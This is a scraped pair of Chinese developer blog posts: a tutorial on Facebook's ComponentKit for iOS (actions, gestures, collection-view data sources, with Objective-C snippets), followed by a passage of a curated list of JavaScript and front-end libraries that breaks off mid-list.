<p>这里一个要点是component不是UIResponder子类，自然无法成为第一响应者~</p>

<h4>点击事件</h4>

<p>解决发生在UIControl视图上的点击事件很简单，只要将某个SEL绑定到<code>CKComponentActionAttribute</code>即可，在接收外界<code>UIControlEvent</code>时候触发：</p>

<pre><code>@implementation SomeComponent

+ (instancetype)new
{
  return [self newWithView:{
    [UIButton class],
    {CKComponentActionAttribute(@selector(didTapButton))}
  }];
}

- (void)didTapButton
{
  // Aha! The button has been tapped.
}

@end
</code></pre>

<h4>手势</h4>

<p>以上对UIControl适用，一般View则要使用绑定一些更牛逼，更直接的属性，比如tap手势绑定SEL到<code>CKComponentTapGestureAttribute</code>，代码如下：</p>

<pre><code>@implementation SomeComponent

+ (instancetype)new
{
  return [self newWithView:{
    [UIView class],
    {CKComponentTapGestureAttribute(@selector(didTapView))}
  }];
}

- (void)didTapView
{
  // The view has been tapped.
}

@end
</code></pre>

<h3>Component Actions</h3>

<p>一句话？元素Action机制 就是通过无脑绑定SEL，顺着响应链找到可以响应该SEL的元素。</p>

<h3>State （TO DO）</h3>

<h2>对iOS中容器类视图的支持（UITableView， UICollectionView）</h2>

<h3>概述</h3>

<p>FB也很淫荡的做了广告：</p>

<blockquote>
  <p>ComponentKit really shines when used with a UICollectionView.</p>
</blockquote>

<p>吐槽下，之所以特地强调，那是必须啊，任何一款APP都特么离不开UITableView或者UICollectionView。只要会UITableView或者UICollectionView那就具备了独立开发的能力，精通这两者的就算具备了犀利哥的潜质。</p>

<p>FB鼓吹的优点：</p>

<ol>
<li>自动重用</li>
<li>流畅的滑动体验  -&gt; CK自身保证非UI相关的计算全在次线程</li>
<li>数据源 这个模块由<code>CKComponentDataSource</code>负责。</li>
</ol>
<p>PS:<code>CKComponentDataSource</code>模块的主要功能：<br>
1）提供输入数据源的操作指令以及数据<br>
2）变化后的数据源布局后台生成<br>
3）提供<code>UITableView</code>或者<code>UICollectionView</code>可用的输出数据源</p>

<h4><code>CKComponentCollectionViewDataSource</code></h4>

<p><code>CKComponentCollectionViewDataSource</code>是<code>CKComponentDataSource</code>的简单封装。<br>
存在价值：</p>

<ol>
<li>负责让<code>UICollectionView</code>适时进行添加/插入/更新“行”，“段”。</li>
<li>负责提供给<code>UICollectionView</code>“行”和“段“排版信息。</li>
<li>
<code>UICollectionView</code>可见行讲同步调用<code>cellForItemAtIndexPath:</code>
</li>
<li>保证返回配置好的cell</li>
</ol>
<p>这里<code>UICollectionView</code>与<code>CKCollectionViewDataSource</code>数据表现来说仍是单向的。</p>

<h3>基础</h3>

<h4><code>Component Provider</code></h4>

<p><code>CKCollectionViewDataSource</code>负责将每一个数据丢给元素(component)进行自我Config。在任何时候需要有某一个元素(component)需要数据进行配置将会把<code>CKCollectionViewDataSource</code>提供的数据源通过<code>CKComponentProvider</code>提供的类方法传入：</p>

<pre><code> @interface MyController &lt;CKComponentProvider&gt;
    ...
    @end

    @implementation MyController
    ...
    + (CKComponent *)componentForModel:(MyModel*)model context:(MyContext*)context {
        return [MyComponent newWithModel:model context:context];
    }
    ...
</code></pre>

<ul>
<li>用类方法不用block 为了保证数据是不可变的</li>
<li>上下文 这里可以是任意不可以变对象，其被<code>CKCollectionViewDataSource</code>带入。它一般是：1）设备类型 2）外部依赖 比如图片下载器</li>
</ul>
<h4>创建<code>CKCollectionViewDataSource</code>：</h4>

<pre><code>- (void)viewDidLoad {
    ...
    self.dataSource = _dataSource = [[CKCollectionViewDataSource alloc] initWithCollectionView:self.collectionView supplementaryViewDataSource:nil componentProvider:[self class] context:context cellConfigurationFunction:nil];
</code></pre>

<h4>添加/修改</h4>

<p>需要做的就是将Model与indexPath进行绑定：</p>

<pre><code>- (void)viewDidAppear {
        ...
        CKArrayControllerSections sections;
        CKArrayControllerInputItems items;
        // Don't forget the insertion of section 0
        sections.insert(0);
        items.insert({0,0}, firstModel);
        // You can also use NSIndexPath
        NSIndexPath indexPath = [NSIndexPath indexPathForItem:1 inSection:0];
        items.insert(indexPath, secondModel);
        [self.dataSource enqueueChangeset:{sections, items} constrainedSize:{{0,0}, {50, 50}}];
    }
</code></pre>

<p>比如indexPath(0, 0)，model是一个字符串“我是0段0行”，告诉<code>CKCollectionViewDataSource</code>将他们绑在一起。</p>

<h4>排版</h4>

<p>因为无脑，只贴代码：</p>

<pre><code> - (CGSize)collectionView:(UICollectionView *)collectionView
                 layout:(UICollectionViewLayout *)collectionViewLayout
                 sizeForItemAtIndexPath:(NSIndexPath *)indexPath {
        return [self.dataSource sizeForItemAtIndexPath:indexPath];
    }
</code></pre>

<h4>事件处理</h4>

<p>因为无脑，只贴代码：</p>

<pre><code> - (void)dataSource:(CKCollectionViewDataSource *)dataSource didSelectItemAtIndexPath:(NSIndexPath *)indexPath
    {
        MyModel *model = (MyModel *)[self.dataSource modelForItemAtIndexPath:indexPath];
        NSURL *navURL = model.url;
        if (navURL) {
            [[UIApplication sharedApplication] openURL:navURL];
        }
    }
</code></pre>

<h3>（数据源）改变集API</h3>

<p>这里主要是指与数据源交互部分的API，主要分为三类：</p>

<ol>
<li>
<strong>动作</strong>（针对行的插入/删除/更新，针对段的插入/删除）</li>
<li>
<strong>位置指定</strong>（行/段位置指定）</li>
<li>
<strong>分配数据</strong>（丢给Component用的）</li>
</ol>
<p>贴代码：</p>

<pre><code>CKArrayControllerInputItems items;
// Insert an item at index 0 in section 0 and compute the component for the model @""Hello""
items.insert({0, 0}, @""Hello"");
// Update the item at index 1 in section 0 and update it with the component computed for the model @""World""
items.update({0, 1}, @""World"");
// Delete the item at index 2 in section 0, no need for a model here :)
Items.delete({0, 2});

Sections sections;
sections.insert(0);
sections.insert(2);
sections.insert(3);

[datasource enqueueChangeset:{sections, items}];
</code></pre>

<p>这里需要注意的是：</p>

<p>1)</p>

<blockquote>
  <p>The order in which commands are added to the changeset doesn't define the order in which those changes will eventually be applied to the <code>UICollectionView</code> (same for <code>UITableViews</code>).</p>
</blockquote>

<p>加入changeset的顺序呢并不代表最终<code>UICollectionView</code>最终应用上的改变顺序。</p>

<p>2)<br>
记得初始化的时候执行<code>sections.insert(0);</code></p>

<p>3)<br><strong>因为所有的改变集都是异步计算的，所以要小心数据与UI不同步的问题出现</strong><br>
3.1）<br>
始终以<code>datasource</code>为唯一标准，不要试图从曾经的数据源like下例中的_listOfModels获取model：</p>

<pre><code>@implementation MyAwesomeController {
    CKComponentCollectionViewDataSource *_datasource;
    NSMutableArray *_listOfModels;
}
</code></pre>

<p>例子中的_datasource才是正房，_listOfModels是小三。<br>
坚持使用</p>

<pre><code>[datasource objectAtindexPath:indexPath];
</code></pre>

<p>3.2)<br>
不要执行像：<code>Items.insert({0, _datasource.collectionView numberOfItemsInSection});</code>的语句，因为你所希望插入的位置未必是你想要插入的位置。</p>

<h2>种子</h2>

<p><a rel=""nofollow"" href=""https://www.youtube.com/watch?v=XhXC4SKOGfQ&amp;t=24m40s"">Facebook's iOS Infrastructure - @Scale 2014 - Mobile</a><br><a rel=""nofollow"" href=""http://www.objc.io/issue-22/facebook.html"">OJBC.IO ComponentKit介绍</a><br><a rel=""nofollow"" href=""http://componentkit.org/docs/getting-started.html"">官方文档</a><br><a rel=""nofollow"" href=""https://code.facebook.com/posts/340384146140520/making-news-feed-nearly-50-faster-on-ios/"">Making News Feed nearly 50% faster on iOS</a><br><a rel=""nofollow"" href=""http://www.w3.org/TR/css3-flexbox/"">Flexbox排版</a></p>

                ", iOS：ComponentKit 使用总结,1531972115,287,1,83,1,1,https://segmentfault.com/a/1190000002706612
152,1,0,6,"
                    
<p>个人阶段性总结，也希望对大家有些帮助。</p>
<p>原文地址： <a href=""https://github.com/lyfeyaj/awesome-resources"" rel=""nofollow noreferrer"">点击查看最新 开发资源总结</a></p>
<blockquote><em>就像开发一样, 这篇文档如果没有人关心和维护, 里面的内容就会变得老旧, 过时而不再具有参考价值. 所以, 我希望所有看到并喜欢这篇文档的人都一起来维护它. 放心大胆的提交 Pull Request 和 Issue 吧!!</em></blockquote>
<p>这是对自己这些年工作的一个总结，各种项目、资源、书籍、博客等</p>
<p>喜欢么？或者对您有用？ <a href=""https://github.com/lyfeyaj/awesome-resources"" rel=""nofollow noreferrer"">☞ 立即去 ⭐️ Star ⭐️ 一下 ☞</a></p>
<h2>贡献方式</h2>
<ul>
<li>Fork 这个项目</li>
<li>请不要直接在 <code>README.md</code> 中直接添加内容</li>
<li>所有的文档都放在 <code>docs</code> 中, 请根据内容找到相应的文件并添加</li>
<li>如果是 Mac 或者 Linux 用户, 请在提交前运行 ./build.sh 来自动生成 <code>README.md</code> 文件</li>
<li>保存并提交</li>
<li>新建一个 Pull Request</li>
</ul>
<h2>Web 前端</h2>
<h4>Javascript</h4>
<ul>
<li>
<a href=""https://github.com/adambom/parallel.js"" rel=""nofollow noreferrer"">parallel.js</a>: 前后端通用的一个并行库</li>
<li>
<a href=""https://github.com/madrobby/zepto"" rel=""nofollow noreferrer"">zepto</a>: 用于现代浏览器的兼容 jQuery 的库</li>
<li>
<a href=""https://github.com/totorojs/totoro"" rel=""nofollow noreferrer"">totoro</a>: 稳定的跨浏览器测试工具</li>
<li>
<a href=""https://github.com/Zhouzi/TheaterJS"" rel=""nofollow noreferrer"">TheaterJS</a>: 一个用于模拟人输入状态的 JS 库</li>
<li>
<a href=""https://github.com/markdalgleish/stellar.js"" rel=""nofollow noreferrer"">stellar.js</a>: 前端用于实现异步滚动效果的库，现已不再维护</li>
<li>
<a href=""https://github.com/Prinzhorn/skrollr"" rel=""nofollow noreferrer"">skrollr</a>: 另一款实现一步滚动的开源库，使用人数众多，可实现各种狂拽酷炫掉渣天的前端效果，<a href=""http://prinzhorn.github.io/skrollr/"" rel=""nofollow noreferrer"">看真相</a>
</li>
<li>
<a href=""https://github.com/nolimits4web/Framework7"" rel=""nofollow noreferrer"">Framework7</a>: 前端框架，是开发人员可以基于 web 技术构建 IOS7 程序</li>
<li>
<a href=""https://github.com/JexCheng/regulex"" rel=""nofollow noreferrer"">regulex</a>: 用于生成 正则表达式 的可视化流程图</li>
<li>
<a href=""https://github.com/markdown-it/markdown-it"" rel=""nofollow noreferrer"">markdown-it</a>: 新型 Markdown 解析器，快速，支持插件</li>
<li>
<a href=""https://github.com/sindresorhus/multiline"" rel=""nofollow noreferrer"">multiline</a>: 用于 Javascript 中的多行文本，类似于 Ruby 的 HERE Doc</li>
<li>
<a href=""https://github.com/sindresorhus/screenfull.js"" rel=""nofollow noreferrer"">screenfull.js</a>: 全屏插件，支持各大浏览器</li>
<li>
<a href=""https://github.com/olivernn/lunr.js"" rel=""nofollow noreferrer"">lunr.js</a>: 类似于 Solr, 但是用于浏览器上的全文搜索引擎，可以为 JSON 创建索引，离线也可以使用</li>
<li>
<a href=""https://github.com/jeresig/jquery.hotkeys"" rel=""nofollow noreferrer"">jquery.hotkeys</a>: jQuery 插件，用于绑定热键</li>
<li>
<a href=""https://github.com/breach/breach_core"" rel=""nofollow noreferrer"">breach_core</a>: Javascript 编写的 Browser (浏览器)</li>
<li>
<a href=""https://github.com/zmmbreeze/octocard"" rel=""nofollow noreferrer"">octocard</a>: 用于生成 Github 信息卡片的库</li>
<li>
<a href=""https://github.com/lepture/github-cards"" rel=""nofollow noreferrer"">github-cards</a>: 用于生成 Github 信息卡片的库</li>
<li>
<a href=""https://github.com/openexchangerates/money.js"" rel=""nofollow noreferrer"">money.js</a>: 轻量级货币转换库，web 和 node 皆可用</li>
<li>
<a href=""https://github.com/openexchangerates/accounting.js"" rel=""nofollow noreferrer"">accounting.js</a>: 轻量级的数字、货币转换库</li>
<li>
<a href=""https://github.com/mgechev/javascript-algorithms"" rel=""nofollow noreferrer"">javascript-algorithms</a>: Javascript 实现的各种算法集合</li>
<li>
<a href=""https://github.com/dtao/lazy.js"" rel=""nofollow noreferrer"">lazy.js</a>: 类似于 underscore, 但是会延迟执行，某些场景下，性能会有很大的提升</li>
<li>
<a href=""https://github.com/seajs/seajs"" rel=""nofollow noreferrer"">seajs</a>: 前端模块加载器，解决模块化、依赖等问题</li>
<li>
<a href=""https://github.com/davist11/jQuery-One-Page-Nav"" rel=""nofollow noreferrer"">jQuery-One-Page-Nav</a>: 单页应用中一个用于处理导航栏的库</li>
<li>
<a href=""https://github.com/js-js/js.js"" rel=""nofollow noreferrer"">js.js</a>: Javascript 实现的 javascript JIT</li>
<li>
<a href=""https://github.com/jquery/jquery-ui"" rel=""nofollow noreferrer"">jquery-ui</a>: jQuery 团队开发的 UI 相关的前端库，功能强大</li>
<li>
<a href=""https://github.com/tastejs/todomvc"" rel=""nofollow noreferrer"">todomvc</a>: 分别基于 AngularJS/EmberJS/Backbone等实现的 TODO List, 帮助开发者选择前端 MVC 库</li>
<li>
<a href=""https://github.com/mozilla/localForage"" rel=""nofollow noreferrer"">localForage</a>: Mozilla 出品，用于离线存储，基于IndexedDB, WebSQL 或者 localStorage, 提供一致的接口</li>
<li>
<a href=""https://github.com/Wolfy87/EventEmitter"" rel=""nofollow noreferrer"">EventEmitter</a>: 浏览器版的 EventEmitter</li>
<li>
<a href=""https://github.com/marioizquierdo/jquery.serializeJSON"" rel=""nofollow noreferrer"">jquery.serializeJSON</a>: jQuery 插件，用于将 form 表单序列化成 JSON 数据</li>
<li>
<a href=""https://github.com/knockout/knockout"" rel=""nofollow noreferrer"">knockout</a>: 前端 MVVM 框架，用于开发富前端应用</li>
<li>
<a href=""https://github.com/knsv/mermaid"" rel=""nofollow noreferrer"">mermaid</a>: 可以根据文本生成流程图，类似于 Markdown 的语法</li>
<li>
<a href=""https://github.com/bramp/js-sequence-diagrams"" rel=""nofollow noreferrer"">js-sequence-diagrams</a>: 另一款可以根据文本生成流程图的库，类似于 Markdown 的语法</li>
<li>
<a href=""https://github.com/facebook/flow"" rel=""nofollow noreferrer"">flow</a>: 一个用来检测 Javascript 语法错误的库， Facebook 出品</li>
<li>
<a href=""https://github.com/jaukia/zoomooz"" rel=""nofollow noreferrer"">zoomooz</a>: jQuery 插件，用来处理浏览器缩放</li>
<li>
<a href=""https://github.com/fancyapps/fancyBox"" rel=""nofollow noreferrer"">fancyBox</a>: 一个用于放大缩小图片、Web 内容或者多媒体元素的库，优雅大方</li>
<li>
<a href=""https://github.com/lhorie/mithril.js"" rel=""nofollow noreferrer"">mithril.js</a>: 轻量型前端 MVC 框架，部分使用场景下性能优于 Angular.js 和 React</li>
<li>
<a href=""https://github.com/jashkenas/backbone"" rel=""nofollow noreferrer"">backbone</a>: 强大的前端 MVC 库，鼻祖级前端库，最初为了配合 Rails 来模块化前端应用，兼容性良好 (兼容到 IE6)，插件丰富，性能良好</li>
<li>
<a href=""https://github.com/jasny/jquery.smartbanner"" rel=""nofollow noreferrer"">jquery.smartbanner</a>: <a href=""http://developer.apple.com/library/ios/#documentation/AppleApplications/Reference/SafariWebContent/PromotingAppswithAppBanners/PromotingAppswithAppBanners.html"" rel=""nofollow noreferrer"">smartbanner</a> 是从 IOS6 开始支持的一个新特性, 这个插件提供了对早期 IOS4/5 和 Android 的支持</li>
<li>
<a href=""https://github.com/flesler/jquery.scrollTo"" rel=""nofollow noreferrer"">jquery.scrollTo</a>: 在页面上以一个元素为起始以动画的方式移动(ScrollTo)到另一个元素， 支持回退等</li>
<li>
<a href=""https://github.com/vitch/jScrollPane"" rel=""nofollow noreferrer"">jScrollPane</a>: 自定义的滚动条，让所有浏览器都显示一样的滚动条</li>
<li>
<a href=""https://github.com/peachananr/onepage-scroll"" rel=""nofollow noreferrer"">onepage-scroll</a>: 提供类似于 iPhone6 展示页类似的效果，适用于单页应用，兼容到 IE8</li>
<li>
<a href=""https://github.com/sakabako/scrollMonitor"" rel=""nofollow noreferrer"">scrollMonitor</a>: 前端插件用来监控元素的滚动事件(进入、退出等)，性能很好</li>
<li>
<a href=""https://github.com/janpaepke/ScrollMagic"" rel=""nofollow noreferrer"">ScrollMagic</a>: 神奇的滚动交互效果插件，可以在滚动的过程中设置各种各样的动态效果</li>
<li>
<a href=""https://github.com/paulirish/infinite-scroll"" rel=""nofollow noreferrer"">infinite-scroll</a>: 滚动加载，滚动到最下到自动加载， Paul Irish 大神之作</li>
<li>
<a href=""https://github.com/LeaVerou/animatable"" rel=""nofollow noreferrer"">animatable</a>: 仅仅依靠 <code>border-width</code> 和 <code>background-position</code> 实现的各种动态效果，<a href=""http://leaverou.github.io/animatable/"" rel=""nofollow noreferrer"">看真相</a>
</li>
<li>
<a href=""https://github.com/terrymun/Fluidbox"" rel=""nofollow noreferrer"">Fluidbox</a>: 页面上内嵌图片的放大缩小效果，类似于 <a href=""http://medium.com"" rel=""nofollow noreferrer"">Medium</a> 中的效果</li>
<li>
<a href=""https://github.com/jzaefferer/jquery-validation"" rel=""nofollow noreferrer"">jquery-validation</a>: jQuery 的一个插件，用于校验 Form 表单</li>
<li>
<a href=""https://github.com/dfcb/BigVideo.js"" rel=""nofollow noreferrer"">BigVideo.js</a>: jQuery 的一个插件, 用于实现大背景(视频、图片)效果</li>
<li>
<a href=""https://github.com/kripken/emscripten"" rel=""nofollow noreferrer"">emscripten</a>: 一款基于 LLVM, 可以将 C/C++ 转换成 Javascript 的工具，使得 Javascript 可以近乎 Native 的速度</li>
<li>
<a href=""https://github.com/kazuhikoarase/qrcode-generator"" rel=""nofollow noreferrer"">qrcode-generator</a>: 各种语言的二维码生成工具</li>
<li>
<a href=""https://github.com/matthewhudson/device.js"" rel=""nofollow noreferrer"">device.js</a>: 一个可以检测设备类型的工具，可以让我们根据不同的设备来为其定制响应的 Javascript 和 CSS</li>
<li>
<a href=""https://github.com/jeromeetienne/jquery-qrcode"" rel=""nofollow noreferrer"">jquery-qrcode</a>: jQuery 插件，用来生成二维码</li>
<li>
<a href=""https://github.com/GBKS/Wookmark-jQuery"" rel=""nofollow noreferrer"">Wookmark-jQuery</a>: jQuery 的一个插件，可以用来实现瀑布流的效果</li>
<li>
<a href=""https://github.com/metafizzy/isotope"" rel=""nofollow noreferrer"">isotope</a>: 可以用来过滤、排列布局，实现美观的动态布局切换效果，<a href=""http://isotope.metafizzy.co/"" rel=""nofollow noreferrer"">Demo</a>
</li>
<li>
<a href=""https://github.com/aFarkas/lazysizes"" rel=""nofollow noreferrer"">lazysizes</a>: 功能强大的图片延迟加载工具，可以首先加载一个低质量的图片，然后再加载高质量的图片</li>
<li>
<a href=""https://github.com/kimmobrunfeldt/progressbar.js"" rel=""nofollow noreferrer"">progressbar.js</a>: 简洁美观的进度条，扁平化</li>
<li>
<a href=""https://github.com/pigshell/pigshell"" rel=""nofollow noreferrer"">pigshell</a>: 一个由 Javascript 实现的Shell, 将互联网当做一个大的文件系统, 通过 cd/ls/cat.....等命令, 可以访问 Facebook</li>
</ul>
<p>/Twitter/Google Drive 等网络服务</p>
<ul>
<li>
<a href=""https://github.com/bgrins/spectrum"" rel=""nofollow noreferrer"">spectrum</a>: Js实现的颜色选择器 (Colorpicker)</li>
<li>
<a href=""https://github.com/hilios/jQuery.countdown"" rel=""nofollow noreferrer"">jQuery.countdown</a>: jQuery 倒计时插件</li>
<li>
<a href=""https://github.com/summernote/summernote"" rel=""nofollow noreferrer"">summernote</a>: WYSIWYG 富文本编辑器</li>
<li>
<a href=""https://github.com/LeaVerou/awesomplete"" rel=""nofollow noreferrer"">awesomplete</a>: 非常轻型的一个自动补全 JS 库, 没有任何依赖, 配置简单, 美观</li>
<li>
<a href=""https://github.com/abpetkov/switchery"" rel=""nofollow noreferrer"">switchery</a>: IOS 7 上 Switch 的 JS 实现, 支持 IE8 及以上浏览器</li>
<li>
<a href=""https://github.com/basecamp/trix"" rel=""nofollow noreferrer"">trix</a>: Basecamp 公司出品的富文本编辑器，简洁小巧</li>
<li>
<a href=""http://greensock.com/"" rel=""nofollow noreferrer"">greensock</a>: greensock是一個非常強大的動畫庫，網站內也有很完整的API文檔和examples</li>
<li>
<a href=""https://github.com/moment/moment/"" rel=""nofollow noreferrer"">Moment.js</a> Moment.js 是一个功能丰富的 JavaScript 日期处理类库，用于解析、检验、操作、以及显示日期</li>
<li>
<a href=""https://github.com/webpack/webpack"" rel=""nofollow noreferrer"">webpack</a> webpack 是一个 JavaScript 模块打包工具，功能强悍、插件丰富</li>
</ul>
<h6>Polyfills</h6>
<ul>
<li>
<a href=""https://github.com/scottjehl/picturefill"" rel=""nofollow noreferrer"">picturefill</a>: 响应式的图片 <code>&lt;picture&gt;</code> polyfill, 支持srcset, sizes等</li>
<li>
<a href=""https://github.com/jamesallardice/Placeholders.js"" rel=""nofollow noreferrer"">Placeholders.js</a>: 为不支持的 HTML5 的浏览器提供 Placeholder 支持</li>
<li>
<a href=""https://github.com/LeaVerou/prefixfree"" rel=""nofollow noreferrer"">prefixfree</a>: 自动为 CSS 添加 Vender Prefix，把你从不停添加浏览器前缀的噩梦中解放出来</li>
<li>
<a href=""https://github.com/browserstate/history.js"" rel=""nofollow noreferrer"">history.js</a>: History 接口的功能实现</li>
<li>
<a href=""https://github.com/aFarkas/html5shiv"" rel=""nofollow noreferrer"">html5shiv</a>: 为 IE 等老旧浏览器添加 HTML5 标签支持</li>
<li>
<a href=""https://github.com/paulmillr/es6-shim"" rel=""nofollow noreferrer"">es6-shim</a>: 为浏览器添加 ES6 支持</li>
<li>
<a href=""https://github.com/es-shims/es5-shim"" rel=""nofollow noreferrer"">es5-shim</a>: 为浏览器添加 ES5 支持</li>
<li>
<a href=""https://github.com/scottjehl/Respond"" rel=""nofollow noreferrer"">Respond</a>: 为IE浏览器添加 media query 支持</li>
<li>
<a href=""https://github.com/bestiejs/json3"" rel=""nofollow noreferrer"">json3</a>: 为旧浏览器添加 JSON 支持</li>
</ul>
<h6>HTML5 相关</h6>
<ul>
<li>
<a href=""https://github.com/branding-fe/sensor"" rel=""nofollow noreferrer"">sensor.js</a>: 在智能移动设备浏览器上，通过HTML5的api使用移动设备的功能。定位、运动、倾斜等</li>
<li>
<a href=""https://github.com/maciejczyzewski/hyhyhy"" rel=""nofollow noreferrer"">hyhyhy</a>: 用于创建 基于 HTML5 的 演示文稿</li>
<li>
<a href=""https://github.com/brutaldesign/swipebox"" rel=""nofollow noreferrer"">swipebox</a>: jQuery 插件，用于处理移动端的触摸事件</li>
<li>
<a href=""https://github.com/mailru/FileAPI"" rel=""nofollow noreferrer"">FileAPI</a>: 前端用户处理文件（拖放、多文件上传等）</li>
<li>
<a href=""https://github.com/RubaXa/Sortable"" rel=""nofollow noreferrer"">Sortable</a>: 现代浏览器上用于实现元素拖拽排序的功能，支持 Meteor, AngularJS, React，不依赖 jQuery</li>
<li>
<a href=""https://github.com/nolimits4web/Swiper"" rel=""nofollow noreferrer"">Swiper</a>: 用于实现浏览器上的滑动切换效果，支持硬件加速</li>
<li>
<a href=""https://github.com/liabru/matter-js"" rel=""nofollow noreferrer"">matter-js</a>: 2D 物理效果引擎，碰撞、弹跳等</li>
<li>
<a href=""https://github.com/senchalabs/jQTouch"" rel=""nofollow noreferrer"">jQTouch</a>: 用于辅助创建手机端的 Web 应用，支持主题、Zepto.js 等</li>
<li>
<a href=""https://github.com/daniel-lundin/snabbt.js"" rel=""nofollow noreferrer"">snabbt.js</a>: 一个利用 Javascript 和 CSS transform 的 animation 库</li>
<li>
<a href=""https://github.com/masayuki0812/c3"" rel=""nofollow noreferrer"">c3</a>: 基于 D3 的图表库</li>
<li>
<a href=""https://github.com/ecomfe/echarts"" rel=""nofollow noreferrer"">echarts</a>: 企业级图表库，百度开发</li>
<li>
<a href=""https://github.com/wagerfield/parallax"" rel=""nofollow noreferrer"">parallax.js</a>: 一个用于响应智能手机 orientation 的库</li>
<li>
<a href=""https://github.com/benbarnett/jQuery-Animate-Enhanced"" rel=""nofollow noreferrer"">jQuery-Animate-Enhanced</a>: jQuery 动画库的一个增强，用于现代浏览器</li>
<li>
<a href=""https://github.com/Voog/wysihtml"" rel=""nofollow noreferrer"">wysihtml</a>: 富文本编辑器，适用于现代浏览器</li>
<li>
<a href=""https://github.com/pornel/slip"" rel=""nofollow noreferrer"">slip</a>: 一个通过滑动或者拖拽来操控列表的库</li>
<li>
<a href=""https://github.com/outpunk/evil-icons"" rel=""nofollow noreferrer"">evil-icons</a>: 一个矢量图库，提供 Ruby/Node 等支持</li>
<li>
<a href=""https://github.com/dimsemenov/PhotoSwipe"" rel=""nofollow noreferrer"">PhotoSwipe</a>: JS 的一个图片展示库</li>
<li>
<a href=""https://github.com/zzarcon/focusable"" rel=""nofollow noreferrer"">focusable</a>: 是页面上一个元素高亮的库，<a href=""http://zzarcon.github.io/focusable/"" rel=""nofollow noreferrer"">有图有真相</a>
</li>
<li>
<a href=""https://github.com/paulrouget/firefox.html"" rel=""nofollow noreferrer"">firefox.html</a>: Firefox 在浏览器端的实现 —— HTML 版的 Firefox</li>
<li>
<a href=""https://github.com/jquery/jquery-mobile"" rel=""nofollow noreferrer"">jquery-mobile</a>: jQuery 团队开发的用于辅助手机端 web app 开发的库，基于 HTML5</li>
<li>
<a href=""https://github.com/mcasimir/mobile-angular-ui"" rel=""nofollow noreferrer"">mobile-angular-ui</a>: 基于angularjs和bootstarp的web app开发框架</li>
<li>
<a href=""https://github.com/taye/interact.js"" rel=""nofollow noreferrer"">interact.js</a>: 一个适用于现代浏览器的，用于处理 手势、拖放、缩放等的库</li>
<li>
<a href=""https://github.com/facebook/rebound-js"" rel=""nofollow noreferrer"">rebound-js</a>: 实现部分物理效果，Facebook 出品</li>
<li>
<a href=""https://github.com/addyosmani/basket.js"" rel=""nofollow noreferrer"">basket.js</a>: 基于 LocalStorage 的资源加载器，可以用来缓存 script 和 css, 手机端使用速度快于浏览器直接缓存</li>
<li>
<a href=""https://github.com/cubiq/iscroll"" rel=""nofollow noreferrer"">iscroll</a>: 高性能的滚动(scroll)处理库，功能强大，支持各种事件，不依赖任何的库，且插件丰富, 大众点评的手机端列表滚动就是用这个库处理的</li>
<li>
<a href=""https://github.com/mozilla/metrics-graphics"" rel=""nofollow noreferrer"">metrics-graphics</a>: 基于 D3 的图表库，简洁、高效，Mozilla 出品</li>
<li>
<a href=""https://github.com/paypal/accessible-html5-video-player"" rel=""nofollow noreferrer"">accessible-html5-video-player</a>: Paypal 出品的 Video 播放器</li>
<li>
<a href=""https://github.com/jxnblk/loading"" rel=""nofollow noreferrer"">loading</a>: 几种 Loading 效果，基于 SVG</li>
<li>
<a href=""https://github.com/mintchaos/flippant.js"" rel=""nofollow noreferrer"">flippant.js</a>: 一款能够漂亮的网页元素翻转效果库，代码许久不更新，不过作为源码学习还是不错的</li>
<li>
<a href=""https://github.com/visionmedia/move.js"" rel=""nofollow noreferrer"">move.js</a>: 基于 CSS3 的前端动画框架</li>
<li>
<a href=""https://github.com/julianlloyd/scrollReveal.js"" rel=""nofollow noreferrer"">scrollReveal.js</a>: 使元素以非常酷帅的方式进入画布 (Viewpoint)，看 <a href=""http://scrollrevealjs.org/"" rel=""nofollow noreferrer"">Demo</a>
</li>
<li>
<a href=""https://github.com/Modernizr/Modernizr"" rel=""nofollow noreferrer"">Modernizr</a>: 一个用来检测 HTML5 和 CSS3 支持情况的库</li>
<li>
<a href=""https://github.com/zurb/foundation"" rel=""nofollow noreferrer"">foundation</a>: 另一款前端模版框架，类似于 Bootstrap</li>
<li>
<a href=""https://github.com/designmodo/Flat-UI"" rel=""nofollow noreferrer"">Flat-UI</a>: Bootstrap 的一款主题，简洁美观</li>
<li>
<a href=""https://github.com/fronteed/iCheck"" rel=""nofollow noreferrer"">iCheck</a>: 一款漂亮的 Checkbox 插件</li>
<li>
<a href=""https://github.com/lyfeyaj/Swipe"" rel=""nofollow noreferrer"">Swipe</a>: 非常轻量级的一个图片滑动切换效果库, 性能良好, 尤其是对手机的支持, 压缩后的大小约 5kb</li>
<li>
<a href=""https://github.com/kenwheeler/slick"" rel=""nofollow noreferrer"">slick</a>: 功能异常强大的一个图片滑动切换效果库</li>
<li>
<a href=""https://github.com/t4t5/SocialButtons"" rel=""nofollow noreferrer"">SocialButtons</a>: 漂亮的社交按钮</li>
<li>
<a href=""https://github.com/t4t5/sweetalert"" rel=""nofollow noreferrer"">sweetalert</a>: 一个非常美观的用于替换浏览器默认 alert 的库</li>
<li>
<a href=""https://github.com/web-animations/web-animations-js"" rel=""nofollow noreferrer"">web-animations-js</a>: Javascript 实现的 Web Animation API</li>
<li>
<a href=""https://github.com/maxwellito/vivus"" rel=""nofollow noreferrer"">vivus</a>: 可以动态描绘 SVG 的 JS 库, 支持多种动画</li>
<li>
<a href=""https://github.com/Selz/plyr"" rel=""nofollow noreferrer"">plyr</a>: 轻量, 小巧, 美观的 HTML5 视频播放器</li>
<li>
<a href=""https://github.com/sbstjn/timesheet.js"" rel=""nofollow noreferrer"">timesheet.js</a>: 基于  HTML5 &amp; CSS3 时间表</li>
<li>
<a href=""https://github.com/Mango/slideout"" rel=""nofollow noreferrer"">slideout</a>: 一个非常美观的侧滑菜单</li>
<li>
<a href=""https://github.com/pixijs/pixi.js"" rel=""nofollow noreferrer"">pixi.js</a>: 非常強大的2d遊戲庫，網站內有許多的examples可以學習</li>
<li>
<a href=""https://github.com/mrdoob/three.js/"" rel=""nofollow noreferrer"">three.js</a>: 非常強大的3d遊戲庫</li>
</ul>
<h6>AngularJS</h6>
<ul>
<li>
<a href=""https://github.com/passy/angular-masonry"" rel=""nofollow noreferrer"">angular-masonry</a>: Masonry 的 AngularJS 插件，用于瀑布流</li>
<li>
<a href=""https://github.com/Textalk/angular-schema-form"" rel=""nofollow noreferrer"">angular-schema-form</a>: 根据 JSON 生成响应的 Form 表单</li>
<li>
<a href=""https://github.com/mgonto/restangular"" rel=""nofollow noreferrer"">restangular</a>: Angular 中用来处理 RESTful API 的插件，可替代 $resource</li>
<li>
